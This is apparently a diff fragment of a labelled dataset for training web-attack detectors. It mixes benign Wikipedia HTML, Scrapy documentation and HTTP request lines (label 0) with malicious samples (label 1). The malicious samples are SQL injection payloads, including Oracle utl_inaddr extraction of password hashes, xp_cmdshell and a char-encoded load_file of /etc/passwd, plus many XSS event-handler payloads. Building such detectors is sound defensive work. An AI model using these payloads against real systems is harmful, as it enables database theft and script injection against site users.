+"</span> <span class=""reference-text""><cite class=""citation conference"">Bertini, M; Del Bimbo, A; Torniai, C (2006). ""Automatic annotation and semantic retrieval of video sequences using multimedia ontologies"". <i>MM '06 Proceedings of the 14th ACM international conference on Multimedia </i>. 14th ACM international conference on Multimedia. Santa Barbara: ACM. pp.&#160;679–682. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=conference&amp;rft.atitle=Automatic+annotation+and+semantic+retrieval+of+video+sequences+using+multimedia+ontologies&amp;rft.btitle=MM+%2706+Proceedings+of+the+14th+ACM+international+conference+on+Multimedia&amp;rft.place=Santa+Barbara&amp;rft.pages=679-682&amp;rft.pub=ACM&amp;rft.date=2006&amp;rft.aulast=Bertini&amp;rft.aufirst=M&amp;rft.au=Del+Bimbo%2C+A&amp;rft.au=Torniai%2C+C&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+"</span>"" </a>. <i>BBC News </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20170126133849/http://www.bbc.co.uk/news/health-38717928"">Archived </a> from the original on 26 January 2017<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">26 January",0
+select * from users where id = '1' *$ . or 1 = 1 -- 1',1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
+select * from users where id = '1' + $+%$ or 1 = 1 -- 1',1
+select * from users where id = 1 <@ or 1 = 1 -- 1,1
+"admin"" )  or  ( ""1"" = ""1""/*",1
+select * from users where id = 1 +  ( \. )  or 1 = 1 -- 1,1
+<body id=x tabindex=1 ondeactivate=alert(1)></body><input id=y autofocus>,1
+GET /search?q=printer,0
+"<picture><source srcset=""validimage.png""><image onloadstart=alert(1)></picture>",1
+"<p><a href=""/wiki/Logic"" title=""Logic"">Logic </a><sup id=""cite_ref-Logic_194-0"" class=""reference""><a href=""#cite_note-Logic-194"">&#91;190&#93; </a> </sup> is used for knowledge representation and problem solving, but it can be applied to other problems as well. For example, the <a href=""/wiki/Satplan"" title=""Satplan"">satplan </a> algorithm uses logic for <a href=""/wiki/Automated_planning_and_scheduling"" title=""Automated planning and scheduling"">planning </a><sup id=""cite_ref-Satplan_195-0"" class=""reference""><a href=""#cite_note-Satplan-195"">&#91;191&#93; </a> </sup> and <a href=""/wiki/Inductive_logic_programming"" title=""Inductive logic programming"">inductive logic programming </a> is a method for <a href=""/wiki/Machine_learning"" title=""Machine learning"">learning </a>.<sup id=""cite_ref-Symbolic_learning_techniques_196-0"" class=""reference""><a href=""#cite_note-Symbolic_learning_techniques-196"">&#91;192&#93; </a> </sup>",0
+a' waitfor delay '0:0:10'--,1
+"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;718 </li> </ul>",0
+POST /comment/add,0
+or '' = ',1
+GET /search?q=router,0
+<input autofocus onfocusin=alert(1)>,1
+"<style>@keyframes slidein {}</style><param style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></param>",1
+'sleep 50',1
+a' --,1
+"select * from users where id = 1 or $+<\ union select 1,@@VERSION -- 1",1
+"</span> <span class=""reference-text""><cite class=""citation web"">Chapman, Lizette (7 January 2019). <a rel=""nofollow"" class=""external text"" href=""https://www.latimes.com/business/la-fi-palantir-sales-ipo-20190107-story.html"">""Palantir once mocked the idea of salespeople. Now it's hiring them"" </a>. <i>latimes.com </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">28 February",0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><plaintext id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></plaintext>",1
+"<ul><li><span class=""nowrap""><a href=""/wiki/Biblioth%C3%A8que_nationale_de_France"" title=""Bibliothèque nationale de France"">BNF </a>: <span class=""uid""><a rel=""nofollow"" class=""external text"" href=""https://catalogue.bnf.fr/ark:/12148/cb11932084t"">cb11932084t </a> <a rel=""nofollow"" class=""external text"" href=""https://data.bnf.fr/ark:/12148/cb11932084t"">(data) </a>",0
+GET /blog?id=2,0
+"<div draggable=""true"" contenteditable>drag me</div><template ondrop=alert(1) contenteditable>drop here</template>",1
+* ( | ( mail = *  )  ),1
+"<summary onbeforepaste=""alert(1)"" contenteditable>test</summary>",1
+' or '' = ',1
+"</span>. <i>Infosys </i>. 2018<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">14 January",0
+GET /blog?id=4,0
+"<script oncontextmenu=""alert(1)"">test</script>",1
+or 0 = 0 --,1
+"select * from users where id = 1 or 1#"" (  union select version (  ) ,version (  )  -- 1",1
+"<BR SIZE=""&{alert('')}"">",1
+"<marquee oncut=""alert(1)"" contenteditable>test</marquee>",1
+"select * from users where id = 1 <@.$ union select 1,version (  )  -- 1",1
+"<ul><li><a href=""/wiki/Printed_circuit_board"" title=""Printed circuit board"">Printed circuit board </a> </li>",0
+"<h1 onpaste=""alert(1)"" contenteditable>test</h1>",1
+"<table onclick=""alert(1)"">test</table>",1
+exec xp,1
+<summary onfocusout=alert(1) tabindex=1 id=x></summary><input autofocus>,1
+<basefont id=x tabindex=1 onfocus=alert(1)></basefont>,1
+"<div draggable=""true"" contenteditable>drag me</div><figcaption ondragover=alert(1) contenteditable>drop here</figcaption>",1
+"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> <a rel=""nofollow"" class=""external text"" href=""http://dblp.uni-trier.de/rec/bibtex/conf/iwann/Aleksander95"">BibTex </a> <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/19970302014628/http://www.ee.ic.ac.uk/research/neural/publications/iwann.html"">Archived </a> 2 March 1997 at the <a href=""/wiki/Wayback_Machine"" title=""Wayback Machine"">Wayback Machine </a>. </li>",0
+x' AND 1 =  ( SELECT COUNT ( * )  FROM tabname ) ; --,1
+"<dd><a href=""/wiki/G%C3%B6del"" class=""mw-redirect"" title=""Gödel"">Gödel </a> himself,<sup id=""cite_ref-Gödel_himself_356-0"" class=""reference""><a href=""#cite_note-Gödel_himself-356"">&#91;345&#93; </a> </sup> <a href=""/wiki/John_Lucas_(philosopher)"" title=""John Lucas (philosopher)"">John Lucas </a> (in 1961) and <a href=""/wiki/Roger_Penrose"" title=""Roger Penrose"">Roger Penrose </a> (in a more detailed argument from 1989 onwards) made highly technical arguments that human mathematicians can consistently see the truth of their own ""Gödel statements"" and therefore have computational abilities beyond that of mechanical Turing machines.<sup id=""cite_ref-The_mathematical_objection_357-0"" class=""reference""><a href=""#cite_note-The_mathematical_objection-357"">&#91;346&#93; </a> </sup> However, some people do not agree with the ""Gödelian arguments"".<sup id=""cite_ref-358"" class=""reference""><a href=""#cite_note-358"">&#91;347&#93; </a> </sup><sup id=""cite_ref-359"" class=""reference""><a href=""#cite_note-359"">&#91;348&#93; </a> </sup><sup id=""cite_ref-360"" class=""reference""><a href=""#cite_note-360"">&#91;349&#93; </a> </sup> </dd> </dl>",0
+"select * from users where id = 1 union select 1<@.,version (  )  -- 1",1
+select * from users where id = 1 %!<@ or 1 = 1 -- 1,1
+select * from users where id = '1' or \<\. or 1 = 1 -- 1',1
+</span>(1879) </li>,0
+"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;402–407, </li>",0
+' and 1 = 0 )  union all,1
+"</span> <span class=""reference-text""><a href=""/wiki/Yann_LeCun"" title=""Yann LeCun"">Yann LeCun </a> (2016). Slides on Deep Learning <a rel=""nofollow"" class=""external text"" href=""https://indico.cern.ch/event/510372/"">Online </a> <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160423021403/https://indico.cern.ch/event/510372/"">Archived </a> 23 April 2016 at the <a href=""/wiki/Wayback_Machine"" title=""Wayback Machine"">Wayback Machine </a>",0
+a',1
+"select * from users where id = '1' union select  ( \ ) ,@@VERSION -- 1'",1
+"""hi"""" )  or  ( """"a"""" = """"a""",1
+</span> </a> </i>&#93; </sup> </li> </ul>,0
+GET /products?id=32,0
+"<li><a href=""/wiki/Steve_Omohundro"" title=""Steve Omohundro"">Steve Omohundro </a> </li>",0
+' )  or  ( 'a' = 'a,1
+"<section onbeforecut=""alert(1)"" contenteditable>test</section>",1
+"<div id=""Evolutionary_computation"" style=""font-size:114%;margin:0 4em""><a href=""/wiki/Evolutionary_computation"" title=""Evolutionary computation"">Evolutionary computation </a> </div> </th> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Main Topics </th><td class=""navbox-list navbox-odd hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
+"<style>:target {color: red;}</style><dfn id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dfn>",1
+'; begin declare @var varchar ( 8000 )  set @var = ':' select @var = @var+'+login+'/'+password+' ' from users where login >,1
+POST /register,0
+<rt onblur=alert(1) tabindex=1 id=x></rt><input autofocus>,1
+GET /search?q=keyboard,0
+"select * from users where id = 1 or "".,"" or 1 = 1 -- 1",1
+<p>There are three philosophical questions related to AI:,0
+"<li><a href=""/wiki/Category:Philosophers_of_mind"" title=""Category:Philosophers of mind"">Philosophers category </a> </li>",0
+<body onpointerdown=alert(1)>XSS</body>,1
+"select * from users where id = 1 or @#""{ = 1 union select 1,version (  )  -- 1",1
+"select * from users where id = 1 +$ 1 union select null,@@VERSION -- 1",1
+<datalist id=x tabindex=1 onfocus=alert(1)></datalist>,1
+"</span> <span class=""reference-text"">A. J. Robinson and F. Fallside. The utility driven dynamic error propagation network. Technical Report CUED/F-INFENG/TR.1, Cambridge University Engineering Department, 1987.",0
+"select * from users where id = '1' or 1^ = 1 union select 1,banner from v$version where rownum = 1 -- 1'",1
+"</span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+Economist&amp;rft.atitle=Getting+to+grips+with+military+robotics&amp;rft.date=2018-01-25&amp;rft_id=https%3A%2F%2Fwww.economist.com%2Fnews%2Fspecial-report%2F21735478-autonomous-robots-and-swarms-will-change-nature-warfare-getting-grips&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
+t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
+"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;568–578 </li> </ul>",0
+<input id=x onfocusin=alert(1)>,1
+<rt id=x tabindex=1 ondeactivate=alert(1)></rt><input id=y autofocus>,1
+' or 1 = 1 or '' = ',1
+"select * from users where id = 1 or ""$ ( "" or 1 = 1 -- 1",1
+"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;83–102, 163–176 </li>",0
+Breadth of commonsense knowledge:,0
+"select * from users where id = 1 or ""1;"" = 1 or 1 = 1 -- 1",1
+"<dfn onkeyup=""alert(1)"" contenteditable>test</dfn>",1
+<u id=x tabindex=1 onbeforeactivate=alert(1)></u>,1
+POST /products/delete?id=30,1
+or 0 = 0 #,1
+"<dt><a class=""reference internal"" href=""topics/feed-exports.html""><span class=""doc"">Feed exports",0
+"<li><cite id=""CITEREFLeggHutter2007"" class=""citation techreport"">Legg, Shane; Hutter, Marcus (15 June 2007). <i>A Collection of Definitions of Intelligence </i> (Technical report). <a href=""/wiki/IDSIA"" class=""mw-redirect"" title=""IDSIA"">IDSIA </a>. <a href=""/wiki/ArXiv"" title=""ArXiv"">arXiv </a>:<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//arxiv.org/abs/0706.3639"">0706.3639 </a>",0
+"<sup id=""cite_ref-Emotion_and_affective_computing_144-0"" class=""reference""><a href=""#cite_note-Emotion_and_affective_computing-144"">&#91;141&#93; </a> </sup> Similarly, some <a href=""/wiki/Virtual_assistant"" title=""Virtual assistant"">virtual assistants </a> are programmed to speak conversationally or even to banter humorously; this tends to give naïve users an unrealistic conception of how intelligent existing computer agents actually are.<sup id=""cite_ref-145"" class=""reference""><a href=""#cite_note-145"">&#91;142&#93; </a> </sup>",0
+"<img ondblclick=""alert(1)"">test</img>",1
+or 'a' = 'a,1
+"<li><a href=""/wiki/Knowledge_Graph"" title=""Knowledge Graph"">Knowledge Graph </a><span class=""nowrap"">&#160;",0
+<param id=x tabindex=1 ondeactivate=alert(1)></param><input id=y autofocus>,1
+"<html class=""client-nojs"" lang=""en"" dir=""ltr"">",0
+"select * from users where id = 1 + \+*$ union select null,@@VERSION -- 1",1
+"<dd><a href=""/en/1.0/"">1.0</a></dd>",0
+</ul>,0
+' select name from syscolumns where id  =   ( select id from sysobjects where name  =  tablename' ) --,1
+"<script type=""text/javascript"">",0
+</span></a></dt><dd>See all available exceptions and their meaning.</dd>,0
+"</span> <span class=""reference-text""><a href=""#CITEREFDomingos2015"">Domingos 2015 </a>, Chapter 1.",0
+"select * from users where id = 1 or 1#""{ union select 'a',version (  )  -- 1",1
+"<li id=""cite_note-Neats_vs._scruffies-17""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Neats_vs._scruffies_17-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Neats_vs._scruffies_17-1""><sup><i><b>b </b> </i> </sup> </a> <a href=""#cite_ref-Neats_vs._scruffies_17-2""><sup><i><b>c </b> </i> </sup> </a>",0
+asc,1
+<dir onpointerup=alert(1)>XSS</dir>,1
+"<li><a href=""/wiki/Glossary_of_probability_and_statistics"" title=""Glossary of probability and statistics"">Probability and statistics </a> </li>",0
+or sleep ( __TIME__ )  = ',1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
+<map id=x tabindex=1 onbeforeactivate=alert(1)></map>,1
+"<nobr onclick=""alert(1)"">test</nobr>",1
+<template onpointerdown=alert(1)>XSS</template>,1
+"<div id=""Computer_science"" style=""font-size:114%;margin:0 4em""><a href=""/wiki/Computer_science"" title=""Computer science"">Computer science </a> </div> </th> </tr><tr><td class=""navbox-abovebelow"" colspan=""2"">",0
+"or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+"<s onmousedown=""alert(1)"">test</s>",1
+"select * from users where id = 1 or ""{,"" = 1 or 1 = 1 -- 1",1
+"<address draggable=""true"" ondragstart=""alert(1)"">test</address>",1
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( GRANTED_ROLE  )  )   FROM DBA_ROLE_PRIVS WHERE GRANTEE = SYS.LOGIN_USER  )  )   AND 'i' = 'i,1
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><del id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></del>",1
+)  )  ;waitfor delay '0:0:__TIME__'--,1
+"select * from users where id = 1 or 1#""? union select null,version (  )  -- 1",1
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><image id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></image>",1
+"1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100  )  )   ) ,1,1,1;",1
+"ga('linker:autoLink', ['scrapinghub.com', 'crawlera.com']);",0
+"<spacer onpaste=""alert(1)"" contenteditable>test</spacer>",1
+"1 and ascii ( lower ( substring  (  (  select top 1 name from sysobjects where xtype = 'u' ) , 1, 1  )  )   )  > 116",1
+select,1
+"<div class=""thumb tright"">",0
+"<ul><li><a href=""/wiki/Hexapod_(robotics)"" title=""Hexapod (robotics)"">Hexapod </a> </li> </ul> </li>",0
+<textarea onfocusout=alert(1) id=x></textarea><input autofocus>,1
+x' or 1 = 1 or 'x' = 'y,1
+"select * from users where id = 1 or 1#"", union select null,version (  )  -- 1",1
+<menu onpointerenter=alert(1)>XSS</menu>,1
+"<li><span class=""nowrap""><a href=""/wiki/Integrated_Authority_File"" title=""Integrated Authority File"">GND </a>: <span class=""uid""><a rel=""nofollow"" class=""external text"" href=""https://d-nb.info/gnd/4033447-8"">4033447-8 </a>",0
+"<blockquote onbeforecut=""alert(1)"" contenteditable>test</blockquote>",1
+"</span> <span class=""reference-text""><a href=""#CITEREFDreyfusDreyfus1986"">Dreyfus &amp; Dreyfus 1986 </a>.",0
+' or a = a--,1
+"select * from users where id = 1 union select @<@.,version (  )  -- 1",1
+"<body onbeforepaste=""alert(1)"" contenteditable>test</body>",1
+POST /products/delete?id=70,1
+"<div class=""toctree-wrapper compound"">",0
+"select * from users where id = 1 or  @$# = 1 union select 1,version (  )  -- 1",1
+' or ''*',1
+"<li><a href=""/wiki/Alfred_Radcliffe-Brown"" title=""Alfred Radcliffe-Brown"">Alfred Radcliffe-Brown </a> </li>",0
+"select * from users where id = 1 or 1#""? = 1 union select 1,version (  )  -- 1",1
+or 1 = 1 --,1
+</span> </li> </ul>,0
+"<input oncut=alert(1) value=""XSS"" autofocus>",1
+"<body onresize=""alert(1)"">",1
+0 or 1 = 1,1
+GET /admin/settings,1
+"select * from users where id = 1 or 1#"". union select 'a',version (  )  -- 1",1
+select * from users where id = '1' <@&@ or 1 = 1 -- 1',1
+"<audio autoplay controls onvolumechange=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
+"<style>:target {color: red;}</style><time id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></time>",1
+"<audio onloadeddata=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
+"1 )  or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+<dir onpointermove=alert(1)>XSS</dir>,1
+1 waitfor delay '0:0:10'--,1
+"<svg><path><animateMotion onbegin=alert(1) dur=""1s"" repeatCount=""1"">",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
+"<style>:target {color:red;}</style><spacer id=x style=""transition:color 1s"" ontransitionend=alert(1)></spacer>",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
+"<li><a href=""/wiki/Visualization_(graphics)"" title=""Visualization (graphics)"">Visualization </a> </li>",0
+"<li><a href=""/wiki/Mental_representation"" title=""Mental representation"">Mental representation </a> </li>",0
+"<title oncopy=""alert(1)"" contenteditable>test</title>",1
+"<li><cite id=""CITEREFKismet"" class=""citation web""><a rel=""nofollow"" class=""external text"" href=""http://www.ai.mit.edu/projects/humanoid-robotics-group/kismet/kismet.html"">""Kismet"" </a>. MIT Artificial Intelligence Laboratory, Humanoid Robotics Group<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">25 October",0
+"<>""'%; )  ( &+",1
+GET /products?id=23,0
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
+</span> 2018,0
+"select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1",1
+"<td draggable=""true"" ondragleave=""alert(1)"">test</td>",1
+<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>,1
+"<th ondblclick=""alert(1)"">test</th>",1
+</form>,0
+"select * from users where id = 1 or  ( \. )  = 1 union select 1,@@VERSION -- 1",1
+"</p><p>In 2011, a <i><a href=""/wiki/Jeopardy!"" title=""Jeopardy!"">Jeopardy! </a> </i> <a href=""/wiki/Quiz_show"" class=""mw-redirect"" title=""Quiz show"">quiz show </a> exhibition match, <a href=""/wiki/IBM"" title=""IBM"">IBM </a>'s <a href=""/wiki/Question_answering_system"" class=""mw-redirect"" title=""Question answering system"">question answering system </a>, <a href=""/wiki/Watson_(artificial_intelligence_software)"" class=""mw-redirect"" title=""Watson (artificial intelligence software)"">Watson </a>, defeated the two greatest <i>Jeopardy! </i> champions, <a href=""/wiki/Brad_Rutter"" title=""Brad Rutter"">Brad Rutter </a> and <a href=""/wiki/Ken_Jennings"" title=""Ken Jennings"">Ken Jennings </a>, by a significant margin.<sup id=""cite_ref-FOOTNOTEMarkoff2011_45-0"" class=""reference""><a href=""#cite_note-FOOTNOTEMarkoff2011-45"">&#91;45&#93; </a> </sup> <a href=""/wiki/Moore%27s_law"" title=""Moore&#39;s law"">Faster computers </a>, algorithmic improvements, and access to <a href=""/wiki/Big_data"" title=""Big data"">large amounts of data </a> enabled advances in <a href=""/wiki/Machine_learning"" title=""Machine learning"">machine learning </a> and perception; data-hungry <a href=""/wiki/Deep_learning"" title=""Deep learning"">deep learning </a> methods started to dominate accuracy benchmarks <a href=""/wiki/Deep_learning#Deep_learning_revolution"" title=""Deep learning"">around 2012 </a>.<sup id=""cite_ref-46"" class=""reference""><a href=""#cite_note-46"">&#91;46&#93; </a> </sup> The <a href=""/wiki/Kinect"" title=""Kinect"">Kinect </a>, which provides a 3D body–motion interface for the <a href=""/wiki/Xbox_360"" title=""Xbox 360"">Xbox 360 </a> and the <a href=""/wiki/Xbox_One"" title=""Xbox One"">Xbox One </a>, uses algorithms that emerged from lengthy AI research<sup id=""cite_ref-47"" class=""reference""><a href=""#cite_note-47"">&#91;47&#93; </a> </sup> as do <a href=""/wiki/Intelligent_personal_assistant"" class=""mw-redirect"" title=""Intelligent personal assistant"">intelligent personal assistants </a> in <a href=""/wiki/Smartphone"" title=""Smartphone"">smartphones </a>.<sup id=""cite_ref-48"" class=""reference""><a href=""#cite_note-48"">&#91;48&#93; </a> </sup> In March 2016, <a href=""/wiki/AlphaGo"" title=""AlphaGo"">AlphaGo </a> won 4 out of 5 games of <a href=""/wiki/Go_(game)"" title=""Go (game)"">Go </a> in a match with Go champion <a href=""/wiki/Lee_Sedol"" title=""Lee Sedol"">Lee Sedol </a>, becoming the first <a href=""/wiki/Computer_Go"" title=""Computer Go"">computer Go-playing system </a> to beat a professional Go player without <a href=""/wiki/Go_handicaps"" class=""mw-redirect"" title=""Go handicaps"">handicaps </a>.<sup id=""cite_ref-bbc-alphago_8-1"" class=""reference""><a href=""#cite_note-bbc-alphago-8"">&#91;8&#93; </a> </sup><sup id=""cite_ref-49"" class=""reference""><a href=""#cite_note-49"">&#91;49&#93; </a> </sup> In the 2017 <a href=""/wiki/Future_of_Go_Summit"" title=""Future of Go Summit"">Future of Go Summit </a>, <a href=""/wiki/AlphaGo"" title=""AlphaGo"">AlphaGo </a> won a <a href=""/wiki/AlphaGo_versus_Ke_Jie"" title=""AlphaGo versus Ke Jie"">three-game match </a> with <a href=""/wiki/Ke_Jie"" title=""Ke Jie"">Ke Jie </a>,<sup id=""cite_ref-50"" class=""reference""><a href=""#cite_note-50"">&#91;50&#93; </a> </sup> who at the time continuously held the world No. 1 ranking for two years.<sup id=""cite_ref-51"" class=""reference""><a href=""#cite_note-51"">&#91;51&#93; </a> </sup><sup id=""cite_ref-52"" class=""reference""><a href=""#cite_note-52"">&#91;52&#93; </a> </sup> This marked the completion of a significant milestone in the development of Artificial Intelligence as Go is a relatively complex game, more so than Chess.",0
+"select * from users where id = 1 or 1#""$ union select null,version (  )  -- 1",1
+<dialog onpointerout=alert(1)>XSS</dialog>,1
+select * from users where id = '1' or $ 1 = 1 or 1 = 1 -- 1',1
+' or user like '%,1
+<small onblur=alert(1) tabindex=1 id=x></small><input autofocus>,1
+"<li><a href=""/wiki/Health_informatics"" title=""Health informatics"">Computational healthcare </a> </li>",0
+select * from users where id = '1' or \.<\ or 1 = 1 -- 1',1
+"admin"" )  or ""1"" = ""1""--",1
+"<object draggable=""true"" ondragstart=""alert(1)"">test</object>",1
+"<li>Search for questions on the archives of the <a class=""reference external"" href=""https://groups.google.com/forum/#!forum/scrapy-users"">scrapy-users mailing list</a>.</li>",0
+POST /cart/add,0
+( sqlvuln ),1
+"<nav onmouseover=""alert(1)"">test</nav>",1
+"select * from users where id = '1' union select +\,@@VERSION -- 1'",1
+or a  =  a,1
+<nav onfocusout=alert(1) tabindex=1 id=x></nav><input autofocus>,1
+"<bdi draggable=""true"" ondragstart=""alert(1)"">test</bdi>",1
+"<li><a href=""/wiki/Interactive_evolutionary_computation"" title=""Interactive evolutionary computation"">Interactive evolutionary computation </a> </li> </ul>",0
+"<ul ondblclick=""alert(1)"">test</ul>",1
+),1
+or 1 --',1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
+GET /products?id=29,0
+GET /products?id=17,0
+"<sup id=""cite_ref-149"" class=""reference""><a href=""#cite_note-149"">&#91;146&#93; </a> </sup>",0
+"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;22–23 </li> </ul>",0
+GET /products?id=11,0
+"<a onbeforecut=""alert(1)"" contenteditable>test</a>",1
+"<li id=""cite_note-Chalmers-401""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Chalmers_401-0"">^ </a> </b>",0
+a' or 1 = 1--,1
+"select * from users where id = '1' or @ ( 1 )  = 1 union select 1,version (  )  -- 1'",1
+"<li><a href=""/wiki/Mind%E2%80%93body_dualism"" title=""Mind–body dualism"">Mind–body dualism </a> </li>",0
+"select * from users where id = 1 or 1#""1 union select 'a',version (  )  -- 1",1
+<meta id=x tabindex=1 onbeforedeactivate=alert(1)></meta><input autofocus>,1
+)  union select * from information_schema.tables;,1
+"select * from users where id = 1 or 1#""1 union select 1,version (  )  -- 1",1
+"select * from users where id = 1 union select @ $$,version (  )  -- 1",1
+"<li><a href=""/wiki/Albert_Einstein"" title=""Albert Einstein"">Albert Einstein </a> </li>",0
+GET /products/view?id=37,0
+{s,1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
+"</span> <span class=""reference-text"">",0
+<frame onpointerup=alert(1)>XSS</frame>,1
+"select * from users where id = 1 or "";&"" or 1 = 1 -- 1",1
+GET /blog?id=9,0
+GET /news,0
+"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;341–344, </li>",0
+GET /products/view?id=22,0
+"select * from users where id = 1 or "",{"" or 1 = 1 -- 1",1
+select * from users where id = 1 or $<\ or 1 = 1 -- 1,1
+"</span> <span class=""reference-text""><a href=""/w/index.php?title=Steven_Horst&amp;action=edit&amp;redlink=1"" class=""new"" title=""Steven Horst (page does not exist)"">Horst, Steven </a>, (2005) <a rel=""nofollow"" class=""external text"" href=""http://plato.stanford.edu/entries/computational-mind/"">""The Computational Theory of Mind"" </a> in <i>The Stanford Encyclopedia of Philosophy </i>",0
+"<video onclick=""alert(1)"">test</video>",1
+"</span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=63"" title=""Edit section: Strong AI hypothesis"">edit </a><span class=""mw-editsection-bracket"">]",0
+GET /products/view?id=31,0
+"</p><p>In <a href=""/wiki/Electronic_discovery"" title=""Electronic discovery"">Electronic Discovery (eDiscovery) </a>, the industry has been focused on machine learning (predictive coding/technology assisted review), which is a subset of AI. To add to the soup of applications, Natural Language Processing (NLP) and Automated Speech Recognition (ASR) are also in vogue in the industry.<sup id=""cite_ref-328"" class=""reference""><a href=""#cite_note-328"">&#91;317&#93; </a> </sup>",0
+"<track onkeydown=""alert(1)"" contenteditable>test</track>",1
+"<dl onmousemove=""alert(1)"">test</dl>",1
+<button onpointerdown=alert(1)>XSS</button>,1
+"<dt><a class=""reference internal"" href=""topics/shell.html""><span class=""doc"">Scrapy shell",0
+"<tbody onmouseup=""alert(1)"">test</tbody>",1
+"</p><p>The field of AI research was born at <a href=""/wiki/Dartmouth_workshop"" title=""Dartmouth workshop"">a workshop </a> at <a href=""/wiki/Dartmouth_College"" title=""Dartmouth College"">Dartmouth College </a> in 1956,<sup id=""cite_ref-Dartmouth_conference_31-0"" class=""reference""><a href=""#cite_note-Dartmouth_conference-31"">&#91;31&#93; </a> </sup> where the term ""Artificial Intelligence"" was coined by <a href=""/wiki/John_McCarthy_(computer_scientist)"" title=""John McCarthy (computer scientist)"">John McCarthy </a> to distinguish the field from cybernetics and escape the influence of the cyberneticist <a href=""/wiki/Norbert_Wiener"" title=""Norbert Wiener"">Norbert Wiener </a>.<sup id=""cite_ref-32"" class=""reference""><a href=""#cite_note-32"">&#91;32&#93; </a> </sup> Attendees <a href=""/wiki/Allen_Newell"" title=""Allen Newell"">Allen Newell </a> (<a href=""/wiki/Carnegie_Mellon_University"" title=""Carnegie Mellon University"">CMU </a>), <a href=""/wiki/Herbert_A._Simon"" title=""Herbert A. Simon"">Herbert Simon </a> (CMU), John McCarthy (<a href=""/wiki/Massachusetts_Institute_of_Technology"" title=""Massachusetts Institute of Technology"">MIT </a>), <a href=""/wiki/Marvin_Minsky"" title=""Marvin 